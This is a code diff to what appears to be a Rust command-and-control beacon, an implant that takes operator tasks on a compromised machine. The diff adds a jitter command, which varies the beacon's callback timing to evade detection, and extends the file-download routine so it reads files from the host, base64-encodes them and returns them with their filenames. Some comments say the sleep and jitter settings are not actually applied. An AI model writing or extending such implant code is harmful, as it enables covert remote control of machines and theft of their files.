@@ -147,6 +147,11 @@ async fn execute_task(state: &BeaconState, task: Task) -> Result<()> {
             // In a real implementation, we would update the sleep time here
             Ok(CommandResult::Success(format!("Sleep time set to {} seconds", seconds)))
         }
+        Command::Jitter { percent } => {
+            info!("{} {}", "Setting jitter to".cyan(), format!("{} percent", percent).bright_yellow());
+            // In a real implementation, we would apply this jitter to the sleep time
+            Ok(CommandResult::Success(format!("Jitter set to {}%", percent)))
+        }
         Command::Terminate => {
             info!("{}", "Terminating beacon".red().bold());
             std::process::exit(0);
@@ -226,8 +231,22 @@ fn upload_file(data: &str, destination: &str) -> Result<CommandResult> {
 
 /// Download a file from the beacon
 fn download_file(source: &str) -> Result<CommandResult> {
+    use std::path::Path;
+    
+    // Read the file data
     let data = fs::read(source)?;
     let encoded = base64::engine::general_purpose::STANDARD.encode(data);
     
-    Ok(CommandResult::FileData(encoded))
+    // Extract filename from path
+    let file_name = Path::new(source)
+        .file_name()
+        .and_then(|f| f.to_str())
+        .unwrap_or("unknown_file");
+    
+    // Create a map with file data and metadata
+    let mut file_map = serde_json::Map::new();
+    file_map.insert("FileData".to_string(), serde_json::Value::String(encoded));
+    file_map.insert("FileName".to_string(), serde_json::Value::String(file_name.to_string()));
+    
+    Ok(CommandResult::FileData(file_map))
 }
